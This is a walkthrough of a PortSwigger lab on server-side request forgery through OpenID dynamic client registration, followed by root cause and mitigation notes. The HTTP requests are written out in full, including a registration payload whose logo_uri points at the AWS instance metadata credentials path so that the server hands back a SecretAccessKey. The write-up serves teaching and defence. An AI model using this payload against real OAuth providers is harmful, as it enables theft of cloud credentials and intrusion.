# Lab: SSRF via OpenID Dynamic Client Registration


**Difficulty:** Practitioner  

**Vulnerability:** Server-Side Request Forgery (SSRF)



## 1. Vulnerability Definition





**Server-Side Request Forgery (SSRF)** is a vulnerability that allows an attacker to manipulate a server into sending requests to 
attacker-controlled or internal resources, potentially exposing sensitive information.



In this lab, the OAuth provider allows dynamic client registration and accepts a user-controlled `logo_uri`. The server fetches content 
from this URI without adequately restricting the destination, allowing access to internal cloud metadata.



**Goal:** Retrieve the AWS `SecretAccessKey` from the cloud metadata service.



## 2. Lab Steps



### Step 1: Log in and Identify the OAuth Host



1. Open the lab and start Burp Suite.

2. Click **Login with social media**.

3. Log in using the provided credentials:

   - Username: `wiener`
   - Password: `peter`

4. Navigate to **Proxy → HTTP history**.
5. Find the request sent to the OAuth provider and identify its `Host` header.



In this lab, the OAuth host was:



```text

oauth-0abb009703ff478c8077101902ee008f.oauth-server.net

```



### Step 2: Discover the Registration Endpoint



Send the following request using Burp Repeater:



```http

GET /.well-known/openid-configuration HTTP/2

Host: oauth-0abb009703ff478c8077101902ee008f.oauth-server.net

```



Inspect the JSON response and locate the `registration_endpoint` field:



```json

"registration_endpoint": "https://oauth-0abb009703ff478c8077101902ee008f.oauth-server.net/reg"


```



The dynamic client registration endpoint is `/reg`.



### Step 3: Register a New OAuth Client



Send the following request:



```http

POST /reg HTTP/2

Host: oauth-0abb009703ff478c8077101902ee008f.oauth-server.net

Content-Type: application/json



{

  "redirect_uris": [

    "https://example.com"

  ]

}

```



Click **Send**.



The server returns a response containing a new `client_id`. Save this ID for the next steps.



### Step 4: Test the Logo Endpoint



Use the returned `client_id` to send the following request:



```http

GET /client/CLIENT-ID/logo HTTP/2

Host: oauth-0abb009703ff478c8077101902ee008f.oauth-server.net

```



Replace `CLIENT-ID` with the actual client ID.



In this lab, the response was:



```http

HTTP/2 204 No Content

```



This response contains no body and does not, by itself, prove that SSRF is present.



### Step 5: Exploit the `logo_uri` Parameter


Return to the client registration request and add the `logo_uri` parameter pointing to the cloud metadata endpoint specified in the lab:


```http

POST /reg HTTP/2

Host: oauth-0abb009703ff478c8077101902ee008f.oauth-server.net

Content-Type: application/json



{

  "redirect_uris": [

    "https://example.com"

  ],

  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"

}

```



Click **Send** and save the new `client_id` returned by the server.



**Note:** Burp Collaborator was not used in this run. We proceeded directly to testing the cloud metadata endpoint specified in the lab.



### Step 6: Retrieve the Cloud Metadata



Send a request to the logo endpoint using the new client ID:



```http


GET /client/NEW-CLIENT-ID/logo HTTP/2

Host: oauth-0abb009703ff478c8077101902ee008f.oauth-server.net

```




Replace `NEW-CLIENT-ID` with the ID returned from the registration request containing the modified `logo_uri`.



The server returned:




```http




HTTP/2 200 OK

Content-Type: application/json; charset=utf-8

```



The response body contained AWS credentials, including the `SecretAccessKey` field.



### Step 7: Solve the Lab



1. Locate the `SecretAccessKey` value in the response body.

2. Return to the lab page.

3. Click **Submit solution**.


4. Enter the extracted secret access key.

5. Submit the value and confirm that the lab status changes to **Solved**.



## 3. Root Cause



- The OAuth provider accepted a user-controlled `logo_uri`.

- The server fetched content from the specified URI without adequately restricting access to internal destinations.

- The server could access the cloud metadata service.

- The logo endpoint returned the fetched content, exposing sensitive AWS credentials.


## 4. Attack Flow



`Dynamic Client Registration → Malicious logo_uri → Server-side Request → AWS Cloud Metadata → SecretAccessKey`



## 5. Mitigation




- Validate and restrict user-supplied URLs.


- Block requests to internal IP addresses and cloud metadata endpoints.


- Apply outbound network restrictions (egress filtering).

- Avoid returning fetched resource contents directly to clients.



**Reference:** [PortSwigger — SSRF via OpenID dynamic client registration](https://portswigger.net/web-security/ssrf/lab-ssrf-via-openid-dynamic-client-registration)

